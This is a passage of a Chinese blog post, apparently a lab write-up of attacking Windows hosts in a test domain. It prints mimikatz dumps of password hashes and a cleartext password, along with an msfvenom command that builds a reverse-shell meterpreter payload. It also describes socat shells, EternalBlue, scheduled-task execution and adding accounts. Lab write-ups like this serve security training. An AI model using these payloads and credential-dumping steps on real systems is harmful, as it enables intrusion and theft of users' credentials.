+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * NTLM     : 47a19e53b983df9d382628f16af22ded
+	 * SHA1     : b0af5d9bb628c0c507750b48d4e153da429fbaa6
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 2387905 (00000000:00246fc1)
+Session           : RemoteInteractive from 2
+User Name         : liming
+Domain            : PENTEST
+Logon Server      : WIN-QJ9CO8DHNTS
+Logon Time        : 2021&#x2F;3&#x2F;7 15:01:05
+SID               : S-1-5-21-3110820879-2626127139-941633094-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : liming
+	 * Domain   : PENTEST
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	 [00010000] CredentialKeys
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	tspkg :	
+	wdigest :	
+	 * Username : liming
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : liming
+	 * Domain   : PENTEST.COM
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 2387881 (00000000:00246fa9)
+Session           : RemoteInteractive from 2
+User Name         : liming
+Domain            : PENTEST
+Logon Server      : WIN-QJ9CO8DHNTS
+Logon Time        : 2021&#x2F;3&#x2F;7 15:01:05
+SID               : S-1-5-21-3110820879-2626127139-941633094-1106
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	 [00000003] Primary
+	 * Username : liming
+	 * Domain   : PENTEST
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	tspkg :	
+	wdigest :	
+	 * Username : liming
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : liming
+	 * Domain   : pentest.com
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 2383871 (00000000:00245fff)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;7 15:01:04
+SID               : S-1-5-90-2
+	msv :	
+	 [00000003] Primary
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * NTLM     : 47a19e53b983df9d382628f16af22ded
+	 * SHA1     : b0af5d9bb628c0c507750b48d4e153da429fbaa6
+	tspkg :	
+	wdigest :	
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : DC2012$
+	 * Domain   : pentest.com
+	 * Password : d0 2a b2 b4 e8 73 96 b5 21 51 af 1d a3 38 d3 a9 47 f4 70 bd 6b 5b 92 e6 f7 98 f5 1a b5 13 c7 d3 2d 31 52 3b c9 a7 2b 67 3f 9c 3d 87 8d 96 d5 a9 e2 75 4d 81 35 82 11 83 c2 68 37 c2 78 c3 7f de 93 01 6c 8e 55 b3 c0 51 8d 5b 2d ee 31 81 65 9c 76 f3 19 3e a8 68 d2 e4 9d 4e 98 8c 12 20 68 a3 b5 2e 1c 04 f1 79 5f 44 99 a8 fc 16 6c 25 9c 46 5b 54 53 d8 3e a4 5c cd ac 50 f9 1e 2c 66 6e a6 25 33 7f a1 db b8 8e ce 6a eb 0f dc ed e1 bd e5 76 04 7d 5f 1e 0f ef a9 28 ff 7e af d2 75 be 61 dc 2d 5f e7 1c f6 c8 85 a6 47 0d df d3 90 68 07 4f 19 5a 2e 44 dd b9 23 e3 81 ec 89 37 73 62 3b 4d 63 12 c1 f5 ae 46 a8 a8 01 60 b3 42 fd d7 d9 b1 cd 93 00 b4 5a 8c 78 e2 a2 3e df b3 b2 52 98 b6 24 86 61 05 e6 fd 80 47 12 41 23 47 73 be c2 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 747785 (00000000:000b6909)
+Session           : Interactive from 1
+User Name         : lijun
+Domain            : PENTEST
+Logon Server      : WIN-QJ9CO8DHNTS
+Logon Time        : 2021&#x2F;3&#x2F;6 20:39:49
+SID               : S-1-5-21-3110820879-2626127139-941633094-1108
+	msv :	
+	 [00000003] Primary
+	 * Username : lijun
+	 * Domain   : PENTEST
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	 [00010000] CredentialKeys
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	tspkg :	
+	wdigest :	
+	 * Username : lijun
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : lijun
+	 * Domain   : PENTEST.COM
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 747739 (00000000:000b68db)
+Session           : Interactive from 1
+User Name         : lijun
+Domain            : PENTEST
+Logon Server      : WIN-QJ9CO8DHNTS
+Logon Time        : 2021&#x2F;3&#x2F;6 20:39:49
+SID               : S-1-5-21-3110820879-2626127139-941633094-1108
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	 [00000003] Primary
+	 * Username : lijun
+	 * Domain   : PENTEST
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	tspkg :	
+	wdigest :	
+	 * Username : lijun
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : lijun
+	 * Domain   : PENTEST.COM
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;6 16:59:02
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DC2012$
+Domain            : PENTEST
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;6 16:59:01
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : dc2012$
+	 * Domain   : PENTEST.COM
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # Bye!
+</code></pre>
+
+<p>emmm，依然之抓到了 <strong>hash</strong> ，这里可以尝试对 <strong>hash</strong> 进行爆破，或者使用 <strong>hash传递</strong> 。。不过这个环境似乎不太合适。</p>
+<p>至此，就拿下了 <strong>WIN2012</strong> 了。</p>
+<hr>
+<h3 id="WIN7-172-16-243-223-："><a href="#WIN7-172-16-243-223-：" class="headerlink" title="* WIN7(172.16.243.223)："></a>* WIN7(172.16.243.223)：</h3><p>这里就不说这么多了。依然以 <strong>WIN2008</strong> 作为跳板去攻击吧。</p>
+<h4 id="getshell：-2"><a href="#getshell：-2" class="headerlink" title="- getshell："></a>- getshell：</h4><h5 id="IPC-getshell：-2"><a href="#IPC-getshell：-2" class="headerlink" title="- $IPC getshell："></a>- $IPC getshell：</h5><p>还是在 <strong>远程桌面</strong> 这里操作，这样直观些，其实纯命令行也是同样道理。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192234.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306192234588" loading="lazy"></p>
+</blockquote>
+<p>现在得到了 <strong>任意文件增删读写</strong> 的能力了，这里就不多说了，还是全都试一遍吧。</p>
+<ul>
+<li><p>第一种，使用 <strong>定时任务</strong> + <strong>msf木马</strong> ：</p>
+<p>先生成 <strong>msf木马</strong> ：</p>
+<pre class="language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.243.222 LPORT&#x3D;3325 -f exe &gt; 7.exe</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306191902.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306191902543" loading="lazy"></p>
+</blockquote>
+<p>然后就是上传啥的了，直接略过吧。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192314.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306192314277" loading="lazy"></p>
+</blockquote>
+<p>在 <strong>msf</strong> 开启监听：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192431.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306192431035" loading="lazy"></p>
+</blockquote>
+<p>试试定时任务：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192618.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306192618451" loading="lazy"></p>
+</blockquote>
+<p>看起来是成功加入 <strong>定时任务</strong> 了，不过没有会话被创建，可能是 <strong>WIN7</strong> 机子的时间问题。</p>
+<p>检查了一下，并不是时间问题：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192847.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306192847301" loading="lazy"></p>
+</blockquote>
+<p>再次尝试发现还是不太行，难道是防火墙之类的问题。</p>
+</li>
+<li><p>第二种，尝试打开 <strong>telnet</strong> ：</p>
+<p>emmm，还是先用 <strong>opentelnet</strong> 尝试开启吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306194057.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306194057549" loading="lazy"></p>
+</blockquote>
+<p>看起来应该是失败了：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306194128.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306194128405" loading="lazy"></p>
+</blockquote>
+<p>尝试另一种方式：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306194443.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306194443669" loading="lazy"></p>
+</blockquote>
+<p>emmmm，失败了。</p>
+</li>
+<li><p>第三种，使用及其麻烦的 <strong>socat</strong> ?：</p>
+<p>这个应该是最后招式了。先新建一个 <strong>C:\Temp</strong> 目录，然后按照之前的进行吧。</p>
+<ul>
+<li><p>反向shell：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306195548.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306195548317" loading="lazy"></p>
+</blockquote>
+<p>看起来是失败了。</p>
+</li>
+<li><p>正向shell：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306200005.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306200005890" loading="lazy"></p>
+</blockquote>
+<p>emmm，还行不行，严重怀疑这个定时任务是个假的。。。要么就是 <strong>WIN2008</strong> 的问题了。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>还是 <strong>防火墙</strong> ！！！现在我已经关闭 <strong>WIN2008</strong> 的防火墙了，再次尝试！</p>
+<h5 id="gt-获取-cmdshell：-1"><a href="#gt-获取-cmdshell：-1" class="headerlink" title="&gt; 获取 cmdshell："></a>&gt; 获取 <em>cmdshell</em>：</h5><p>首先是 <strong>socat</strong> 方式去 <strong>getshell</strong> ：</p>
+<ul>
+<li><p>反向shell：</p>
+<p>emmm，看起来还是不太行。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307161159.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307161159669" loading="lazy"></p>
+</blockquote>
+</li>
+<li><p>正向shell：</p>
+<p>成功了！！！</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307161336.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307161336500" loading="lazy"></p>
+</blockquote>
+</li>
+</ul>
+<p>尝试添加一个用户吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307161623.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307161623431" loading="lazy"></p>
+</blockquote>
+<p>OK！接下来是用 <strong>定时任务</strong> + <strong>msf木马</strong>。</p>
+<h5 id="gt-获取-meterpretershell：-1"><a href="#gt-获取-meterpretershell：-1" class="headerlink" title="&gt; 获取 meterpretershell："></a>&gt; 获取 <em>meterpretershell</em>：</h5><p>先生成一个另外端口的简单的 <strong>msf木马</strong> 吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307162139.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307162139569" loading="lazy"></p>
+</blockquote>
+<p>然后是 <strong>监听</strong> 和 <strong>定时任务</strong> 一气呵成：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307162350.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307162350814" loading="lazy"></p>
+</blockquote>
+<p>emmm，看起来并没有成功。那么试试 <strong>msf</strong> 的正向shell：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307163343.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307163343588" loading="lazy"></p>
+</blockquote>
+<p>然后用 <strong>定时任务</strong> 启动 <strong>msf木马</strong> 并且使用 <strong>msf</strong> 连接：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307163604.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307163603931" loading="lazy"></p>
+</blockquote>
+<p>成功了！！！</p>
+<h5 id="445永恒之蓝-getshell：-2"><a href="#445永恒之蓝-getshell：-2" class="headerlink" title="- 445永恒之蓝 getshell："></a>- 445永恒之蓝 getshell：</h5><p>话不多说，直接上 <strong>msf</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306201152.png?x-oss-process=image/auto-orient,1/interlace,1" loading="lazy"></p>
+</blockquote>
+<p>还是同样的问题，<strong>WIN2008</strong> 的 <strong>meterpretershell</strong> 会话一直关，无法做跳板。整吐了。</p>
+<p>直接尝试用另一个开启 <strong>远程桌面</strong> 吧，然而并不行：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306205300.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306205300823" loading="lazy"></p>
+</blockquote>
+<h5 id="gt-获取-cmdshell：-2"><a href="#gt-获取-cmdshell：-2" class="headerlink" title="&gt; 获取 cmdshell："></a>&gt; 获取 <em>cmdshell</em>：</h5><p>emmmm，对了，现在我把 <strong>WIN2008</strong> 的 <strong>防火墙</strong> 给关了！！！然后再试试：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164515.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307164515539" loading="lazy"></p>
+</blockquote>
+<p>成功了，试试提升一下 <strong>shell</strong> 。</p>
+<h5 id="gt-获取-meterpretershell：-2"><a href="#gt-获取-meterpretershell：-2" class="headerlink" title="&gt; 获取 meterpretershell："></a>&gt; 获取 <em>meterpretershell</em>：</h5><p>可以尝试用 <strong>cmdshell</strong> 直接提升：</p>
+<pre class="language-none"><code class="language-none">use post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164718.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307164717866" loading="lazy"></p>
+</blockquote>
+<p>OK，成功了！</p>
+<h4 id="权限提升：-2"><a href="#权限提升：-2" class="headerlink" title="- 权限提升："></a>- 权限提升：</h4><p>还是先看当前用户权限：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164807.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307164807181" loading="lazy"></p>
+</blockquote>
+<p>很好，然后是尝试 <strong>迁徙</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164903.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307164903101" loading="lazy"></p>
+</blockquote>
+<p>尝试 <strong>创建用户</strong> 吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307165009.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307165008926" loading="lazy"></p>
+</blockquote>
+<p>OK，加权限：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307165034.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307165034529" loading="lazy"></p>
+</blockquote>
+<h4 id="抓密码：-2"><a href="#抓密码：-2" class="headerlink" title="- 抓密码："></a>- 抓密码：</h4><p>emmm，还是直接上 <strong>kiwi</strong> 吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307173337.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307173337707" loading="lazy"></p>
+</blockquote>
+<p>不太行呀，不妨上传 <strong>mimikatz</strong> 的二进制文件试试。</p>
+<h4 id="远程登录："><a href="#远程登录：" class="headerlink" title="- 远程登录："></a>- 远程登录：</h4><p>直接打开 <strong>远程桌面</strong> ：</p>
+<p><img src="C:\Users\22929\AppData\Roaming\Typora\typora-user-images\image-20210307173902444.png" alt="image-20210307173902444" loading="lazy"></p>
+<p>不过在 <strong>WIN7</strong> 这么做会把当前用户给挤下来的。行吧，现在是可以登上去了。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307181926.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307181926113" loading="lazy"></p>
+</blockquote>
+<h5 id="继续抓密码：-1"><a href="#继续抓密码：-1" class="headerlink" title="- 继续抓密码："></a>- 继续抓密码：</h5><p>emmm，还是上传 <strong>mimikatz</strong> 的二进制文件试试吧。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307182148.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307182148094" loading="lazy"></p>
+</blockquote>
+<p>然后尝试抓密码：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307182456.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307182456864" loading="lazy"></p>
+</blockquote>
+<p>得到结果：</p>
+<pre class="language-none"><code class="language-none">
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## &#x2F; \ ##  &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )
+ ## \ &#x2F; ##       &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com   ***&#x2F;
+
+mimikatz(commandline) # privilege::debug
+Privilege &#39;20&#39; OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 436843 (00000000:0006aa6b)
+Session           : RemoteInteractive from 2
+User Name         : dq3
+Domain            : WIN7PC
+Logon Server      : WIN7PC
+Logon Time        : 3&#x2F;7&#x2F;2021 6:17:47 PM
+SID               : S-1-5-21-3896396058-1421024651-3276018989-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * LM       : e62b17732338d7586e72264e11f708c0
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	tspkg :	
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * Password : Qwe123!!!
+	wdigest :	
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * Password : Qwe123!!!
+	kerberos :	
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * Password : Qwe123!!!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 436812 (00000000:0006aa4c)
+Session           : RemoteInteractive from 2
+User Name         : dq3
+Domain            : WIN7PC
+Logon Server      : WIN7PC
+Logon Time        : 3&#x2F;7&#x2F;2021 6:17:47 PM
+SID               : S-1-5-21-3896396058-1421024651-3276018989-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * LM       : e62b17732338d7586e72264e11f708c0
+	 * NTLM     : 1537fe1ed860996391d04a916cf9eb20
+	 * SHA1     : a0912f3a7b57e6d2a683178eb586267dca6b312d
+	tspkg :	
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * Password : Qwe123!!!
+	wdigest :	
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * Password : Qwe123!!!
+	kerberos :	
+	 * Username : dq3
+	 * Domain   : WIN7PC
+	 * Password : Qwe123!!!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3&#x2F;7&#x2F;2021 6:01:59 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN7PC$
+Domain            : PENTEST
+Logon Server      : (null)
+Logon Time        : 3&#x2F;7&#x2F;2021 6:01:59 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN7PC$
+	 * Domain   : PENTEST
+	 * NTLM     : d474d4af5ae26f8e920338d5abd04d2c
+	 * SHA1     : e1c2cf6893a6d001872c129fc79a66b438ff393f
+	tspkg :	
+	wdigest :	
+	 * Username : WIN7PC$
+	 * Domain   : PENTEST
+	 * Password : d1 42 2a 9b 68 fa d9 a7 cd c9 5e ba aa 09 8e a1 f7 7a 81 d5 49 be 5a 6f 3c d4 7b b3 e0 fb 4c 45 44 5a 9f d0 65 ab 64 7e ba af f6 37 71 96 da da 01 16 58 a2 f6 70 00 53 e6 78 8d 40 cd d5 82 f1 27 15 79 a6 b8 d8 2a 62 0d 10 94 20 a0 f5 33 72 c9 b0 55 ec a2 87 80 fd e5 f7 eb 2b 94 bc b9 09 f9 bc 0c 19 6c d1 76 a4 ce 18 2e 41 0f e8 5e 9b 6d 5d 34 aa 9b aa 81 b8 71 43 0c c5 da b7 36 83 59 dd e3 d9 92 fc 10 e3 30 b9 0e b3 d1 10 a2 3b 9d fa f7 ca 41 fa c2 5a 58 19 ad ee 7b 40 93 e7 a7 3a d9 85 46 53 88 69 9e a9 32 68 2a 03 01 38 3e 0d f4 03 a8 04 a9 29 1c d0 32 77 74 52 dd fb f1 47 0a 7e e3 d8 7c b2 eb e8 d4 84 68 d4 53 f6 69 b9 e5 92 a6 03 60 76 c5 25 ef 02 76 d6 13 10 ba 19 c2 1b 30 92 b1 6c 97 ff e1 02 2f 0f db b4 
+	kerberos :	
+	 * Username : win7pc$
+	 * Domain   : PENTEST.COM
+	 * Password : d1 42 2a 9b 68 fa d9 a7 cd c9 5e ba aa 09 8e a1 f7 7a 81 d5 49 be 5a 6f 3c d4 7b b3 e0 fb 4c 45 44 5a 9f d0 65 ab 64 7e ba af f6 37 71 96 da da 01 16 58 a2 f6 70 00 53 e6 78 8d 40 cd d5 82 f1 27 15 79 a6 b8 d8 2a 62 0d 10 94 20 a0 f5 33 72 c9 b0 55 ec a2 87 80 fd e5 f7 eb 2b 94 bc b9 09 f9 bc 0c 19 6c d1 76 a4 ce 18 2e 41 0f e8 5e 9b 6d 5d 34 aa 9b aa 81 b8 71 43 0c c5 da b7 36 83 59 dd e3 d9 92 fc 10 e3 30 b9 0e b3 d1 10 a2 3b 9d fa f7 ca 41 fa c2 5a 58 19 ad ee 7b 40 93 e7 a7 3a d9 85 46 53 88 69 9e a9 32 68 2a 03 01 38 3e 0d f4 03 a8 04 a9 29 1c d0 32 77 74 52 dd fb f1 47 0a 7e e3 d8 7c b2 eb e8 d4 84 68 d4 53 f6 69 b9 e5 92 a6 03 60 76 c5 25 ef 02 76 d6 13 10 ba 19 c2 1b 30 92 b1 6c 97 ff e1 02 2f 0f db b4 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 51341 (00000000:0000c88d)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3&#x2F;7&#x2F;2021 6:01:59 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN7PC$
+	 * Domain   : PENTEST
+	 * NTLM     : d474d4af5ae26f8e920338d5abd04d2c
+	 * SHA1     : e1c2cf6893a6d001872c129fc79a66b438ff393f
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN7PC$
+Domain            : PENTEST
+Logon Server      : (null)
+Logon Time        : 3&#x2F;7&#x2F;2021 6:01:59 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN7PC$
+	 * Domain   : PENTEST
+	 * Password : d1 42 2a 9b 68 fa d9 a7 cd c9 5e ba aa 09 8e a1 f7 7a 81 d5 49 be 5a 6f 3c d4 7b b3 e0 fb 4c 45 44 5a 9f d0 65 ab 64 7e ba af f6 37 71 96 da da 01 16 58 a2 f6 70 00 53 e6 78 8d 40 cd d5 82 f1 27 15 79 a6 b8 d8 2a 62 0d 10 94 20 a0 f5 33 72 c9 b0 55 ec a2 87 80 fd e5 f7 eb 2b 94 bc b9 09 f9 bc 0c 19 6c d1 76 a4 ce 18 2e 41 0f e8 5e 9b 6d 5d 34 aa 9b aa 81 b8 71 43 0c c5 da b7 36 83 59 dd e3 d9 92 fc 10 e3 30 b9 0e b3 d1 10 a2 3b 9d fa f7 ca 41 fa c2 5a 58 19 ad ee 7b 40 93 e7 a7 3a d9 85 46 53 88 69 9e a9 32 68 2a 03 01 38 3e 0d f4 03 a8 04 a9 29 1c d0 32 77 74 52 dd fb f1 47 0a 7e e3 d8 7c b2 eb e8 d4 84 68 d4 53 f6 69 b9 e5 92 a6 03 60 76 c5 25 ef 02 76 d6 13 10 ba 19 c2 1b 30 92 b1 6c 97 ff e1 02 2f 0f db b4 
+	kerberos :	
+	 * Username : win7pc$
+	 * Domain   : PENTEST.COM
+	 * Password : d1 42 2a 9b 68 fa d9 a7 cd c9 5e ba aa 09 8e a1 f7 7a 81 d5 49 be 5a 6f 3c d4 7b b3 e0 fb 4c 45 44 5a 9f d0 65 ab 64 7e ba af f6 37 71 96 da da 01 16 58 a2 f6 70 00 53 e6 78 8d 40 cd d5 82 f1 27 15 79 a6 b8 d8 2a 62 0d 10 94 20 a0 f5 33 72 c9 b0 55 ec a2 87 80 fd e5 f7 eb 2b 94 bc b9 09 f9 bc 0c 19 6c d1 76 a4 ce 18 2e 41 0f e8 5e 9b 6d 5d 34 aa 9b aa 81 b8 71 43 0c c5 da b7 36 83 59 dd e3 d9 92 fc 10 e3 30 b9 0e b3 d1 10 a2 3b 9d fa f7 ca 41 fa c2 5a 58 19 ad ee 7b 40 93 e7 a7 3a d9 85 46 53 88 69 9e a9 32 68 2a 03 01 38 3e 0d f4 03 a8 04 a9 29 1c d0 32 77 74 52 dd fb f1 47 0a 7e e3 d8 7c b2 eb e8 d4 84 68 d4 53 f6 69 b9 e5 92 a6 03 60 76 c5 25 ef 02 76 d6 13 10 ba 19 c2 1b 30 92 b1 6c 97 ff e1 02 2f 0f db b4 
+	ssp :	
+	credman :	
+
+mimikatz # Bye!</code></pre>
+
+<p>emmm，只得到了刚刚新建用户 <strong>dq3</strong> 的明文密码，和一些 <strong>hash</strong> 。</p>
+<p>至此，就拿下了 <strong>WIN7</strong> 了。</p>
+<hr>
